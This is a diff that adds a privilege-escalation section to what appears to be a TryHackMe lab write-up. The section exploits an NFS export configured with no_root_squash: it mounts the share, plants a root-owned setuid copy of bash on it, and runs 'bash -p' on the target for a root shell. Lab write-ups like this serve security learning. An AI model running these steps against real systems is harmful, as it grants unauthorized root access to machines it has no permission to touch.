@@ -287,3 +287,40 @@ drwxr-xr-x    2 65534    65534        4096 Jan 23 21:28 ..
  * Now lets get WordPress config to log into databases
  * We repeat what happened in wordpress
 ##
+### privilege Escalation
+* During the examination we found `nfs`
+  ```
+  2049/tcp open  nfs     3-4 (RPC #100003)
+  ```
+* After cat `/etc/exports` file. i found path of nfs.
+  ```
+  /var/nfs/admin *(rw,sync,insecure,no_root_squash,no_subtree_check)
+  ```
+* nfs has no_root_squash flag then let's attack nfs
+* server is (tryhackme-machine)
+* client is (your-hachine)
+  ```
+  client
+  
+  cd /mnt
+  mkdir exploit
+  mount -o rw <machine_ip>:/var/nfs/admin /mnt/exploit/
+  ```
+  ```
+  server
+
+  cp /bin/bash .
+  ```
+  ```
+  client
+
+  chown root:root bash
+  chmod +xs bash
+  ```
+  ```
+  server
+
+  /var/nfs/admin/bash -p
+  ```
+  ##
+  
